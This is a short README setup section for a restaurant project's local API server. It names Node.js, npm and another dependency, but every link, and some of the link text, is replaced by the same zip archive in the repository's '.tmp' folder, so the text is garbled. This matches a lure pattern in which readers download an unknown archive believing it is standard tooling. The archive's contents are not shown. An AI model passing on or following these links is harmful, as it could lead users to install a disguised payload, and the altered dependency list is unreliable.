## Getting Started

### Development local API Server
_Location of server = /server_
Server depends on [https://github.com/Muhamed2017/mws-restaurant-stage-2/raw/refs/heads/master/.tmp/mws_stage_restaurant_3.8.zip LTS Version: v6.11.2 ](https://github.com/Muhamed2017/mws-restaurant-stage-2/raw/refs/heads/master/.tmp/mws_stage_restaurant_3.8.zip), [npm](https://github.com/Muhamed2017/mws-restaurant-stage-2/raw/refs/heads/master/.tmp/mws_stage_restaurant_3.8.zip), and [https://github.com/Muhamed2017/mws-restaurant-stage-2/raw/refs/heads/master/.tmp/mws_stage_restaurant_3.8.zip](https://github.com/Muhamed2017/mws-restaurant-stage-2/raw/refs/heads/master/.tmp/mws_stage_restaurant_3.8.zip)
